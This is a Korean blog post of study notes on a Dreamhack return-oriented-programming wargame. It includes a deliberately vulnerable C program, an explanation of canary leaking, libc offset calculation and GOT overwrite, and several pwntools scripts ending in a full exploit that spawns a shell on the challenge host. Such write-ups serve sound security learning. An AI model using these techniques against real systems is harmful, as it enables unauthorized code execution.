---
layout: post
title: "Return Oriented Programming(ROP)"
categories: [System Hacking]
tags: [ROP, Exploit, CTF, Wargame]
last_modified_at: 2024-02-03
---

Exploit Tech: Return Oriented Programming  
Return Oriented Programming  
리턴 가젯을 이용하여 복잡한 실행 흐름 구현하는 기법  
Return to library, Return to dl-resolve, GOT overwrite 등의 페이로드 구성 가능..  

ROP 페이로드는 리턴 가젯으로 구성  
ret단위로 여러 코드 연쇄적 실행 -> ROP chain  

### 분석
```cpp
// Name: rop.c
// Compile: gcc -o rop rop.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  puts("[1] Leak Canary");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);

  return 0;
}
```

**보호 기법 검사**  
canary, nx 적용, ASLR 존재  

**코드 분석**  
지난 코스와 달리 system 호출 없음 -> PLT 등록 X  
"/bin/sh" 문자열 없음  

### 익스플로잇 설계
**1. 카나리 우회**  
**2. system 함수의 주소 계산**  
system 함수는 libc.so.6에 정의되어 있음  
이 라이브러리를 참조하는 read, puts, printf 존재..  
라이브러리 파일은 전체가 매핑되므로 system 함수도 메모리 어딘가에 매핑됨  

system 함수를 직접 호출하지 않아서 GOT에는 등록되지 않았음  
but.. GOT에 등록된 read, puts, printf  
이들의 GOT를 읽으면 libc.so.6 매핑된 영역 구할 수 있음  
-> 같은 libc 안에서 데이터 사이 오프셋 항상 동일, libc의 버전을 알면 다른 데이터 주소 계산 가능  

이 워게임에서는 libc.so.6 파일을 줬다(이걸로 실행하면 됨.. 나는 없는 줄 알고 찾아 헤맸다..)  

ex) Ubuntu GLIBC 2.35-0ubuntu3.1에서 read와 system의 오프셋 0xc3c20  
system=read-0xc3c20으로 system 함수 주소 구하기  
libc 파일이 있으면 readelf 명령어로 오프셋 구하기 가능  

![Image](https://blog.kakaocdn.net/dna/TmxCe/btsEmSIXwL8/AAAAAAAAAAAAAAAAAAAAAOALu7tUcTGARUVYJ-O5Qh0gbB1G5Vwwi5Z6xCzgX6W_/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=6R98ymScFUBgKBtFXkUMCkeqGmE%3D)  

0x114980-0xc3c20 계산하면 system 오프셋인 0x50d60  

**3. "/bin/sh"**  
해당 문자열이 데이터 영역에 없음..  
1. 임의 버퍼에 직접 주입 후 참조  
2. 다른 파일에 포함된 문자열 사용  
해당 문자열은 libc.so.6에 포함됨 <- 2번 방법 차용 가능  
주소 계산은 2번의 system 함수 주소와 비슷하게 구함  

![Image](https://blog.kakaocdn.net/dna/l3OBt/btsEnhaFdma/AAAAAAAAAAAAAAAAAAAAABYEOKbBnJ8f7Hy9yHqxNUORqm8GIlgqw53stBs_lSJU/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=huhYbfSRppMbo9A7RzS%2BWnLQn6Y%3D)  

**4. GOT Overwrite**  
system 주소를 알아냄 -> ROP 페이로드 이미 전송  
알아낸 system 주소 페이로드 <- main함수에서 다시 버퍼 오버플로우 발생  
이러한 공격 패턴 ret2main  

복습) Lazy binding  
1. 호출할 라이브러리 함수 탐색  
2. GOT에 주소 작성 후 호출  
3. 재호출 시, GOT 참조  
GOT overwrite에서는 3번에 아무런 보안 검사가 없다는 점 이용  

### 익스플로잇
**1. 카나리 우회와 system 함수 주소 계산**  
카나리는 했던대로.. 해주면 되고  
system 함수의 주소 계산은 아까 system=read-항상 동일한 오프셋(뭐더라) 해주면 됨  
1. read의 got 읽기(got에는 주소가 저장되어 있으니)  
2. system 주소 계산  

```python
from pwn import *

p = remote('host3.dreamhack.games', port) 
e = ELF('./rop')
context.arch = 'amd64' 

def slog(n, m): return success(': '.join([n, hex(m)])) 

# [1] cnry 구하기 
payload = b'A' * 0x39 
p.recvline() 
p.sendafter(b'Buf: ', payload) 
p.recvuntil(payload) 
cnry = u64(b'\x00' + p.recv(7))
slog('canary', cnry) 

# [2] system 함수 주소 구하기 
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") # 실제 워게임에서는 파일 줬음 변경하면 됨 ㅇㅇ 
read_system = libc.symbols["read"] - libc.symbols["system"] 
read_plt = e.plt['read'] 
read_got = e.got['read'] 
write_plt = e.plt['write']
```

**2. GOT Overwrite 및 "/bin/sh" 입력**  
문자열은 got 엔트리 뒤에 입력하면 됨  
read함수 사용 -> 필요한 인자: 스트림, 버퍼, 길이(총 3개)  
호출 규약에 따라 rdi, rsi, rdx  

rdx와 관련된 가젯은 찾기 어려움 -> libc 코드 가젯이나 libc_csu_init 가젯으로 해결(혹은 rdx 값 변화시키는 함수 호출)  
ex) strncmp함수도 rdx가 필요함..약간 n을 요구하는 함수들은 다 rdx가 들어가는듯..?  

![Image](https://blog.kakaocdn.net/dna/bgkws2/btsEmCs3Qen/AAAAAAAAAAAAAAAAAAAAAFp7ofpL71XLwIBtO-T5bCBkF0W5Dh4uFKEnMwrr8Iio/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=UTQ1de2sRDPBpDBUmBZdy3TvqbA%3D)  

이전에 했던 것처럼 ROPgadget으로 찾아줌  
아니 근데 찾아놨더니 rdx값이 어느정도 크게 설정된다고 추가 안 해도 된대(아니 왜 찾으라 한거야ㅡㅡ)  
reliable한 익스플로잇을 위해서 추가해도 된다네요  

```python
#!/usr/bin/env python3
# Name: rop.py
from pwn import *

def slog(name, addr): return success(': '.join([name, hex(addr)]))

p = process('./rop')
e = ELF('./rop')
libc = ELF('./libc.so.6')

# [1] Leak canary
buf = b'A' * 0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)

# [2] Exploit
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
pop_rdi = 0x0000000000400853
pop_rsi_r15 = 0x0000000000400851
ret = 0x0000000000400854

payload = b'A' * 0x38 + p64(cnry) + b'B' * 0x8

# write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

# read(0, read_got, ...)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)
```

**3. 셸 획득**  
read 함수의 GOT를 system함수 주소로 덮었음 -> read 부를 때마다 GOT에서 system 함수 가지고 온다는 소리  
저번 rtl처럼 pop rdi 부르고 문자열 넣고 read  
여기서 문자열은 read_got(ret)+0x8  

```python
# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)

p.sendafter(b'Buf: ', payload)
read = u64(p.recvn(6) + b'\x00' * 2)
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
slog('read', read)
slog('libc_base', lb)
slog('system', system)

p.send(p64(system) + b'/bin/sh\x00')
```

**4. 풀 익스플로잇**  
```python
#!/usr/bin/env python3
# Name: rop.py
from pwn import *

def slog(name, addr): return success(': '.join([name, hex(addr)]))

p = remote('host3.dreamhack.games', 20998) 
e = ELF('./rop')
libc = ELF('./libc.so.6')

# [1] Leak canary
buf = b'A' * 0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)

# [2] Exploit
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
pop_rdi = 0x0000000000400853
pop_rsi_r15 = 0x0000000000400851
ret = 0x0000000000400854

payload = b'A' * 0x38 + p64(cnry) + b'B' * 0x8

# write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

# read(0, read_got, ...)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)

p.sendafter(b'Buf: ', payload)
read = u64(p.recvn(6) + b'\x00' * 2)
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
slog('read', read)
slog('libc_base', lb)
slog('system', system)

p.send(p64(system) + b'/bin/sh' + b'\x00')

p.interactive()
```

![Image](https://blog.kakaocdn.net/dna/r7ezR/btsEm7TzKgA/AAAAAAAAAAAAAAAAAAAAAJtBwNelhxeNyxZuw7j4U9_8_yg163JCmb_1MCgNmvXI/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=C9t%2B6fRZEKUuS5axWd7Y7%2FsqDOM%3D)  

되긴 했는데 저거 저렇게 떠도 괜찮은건가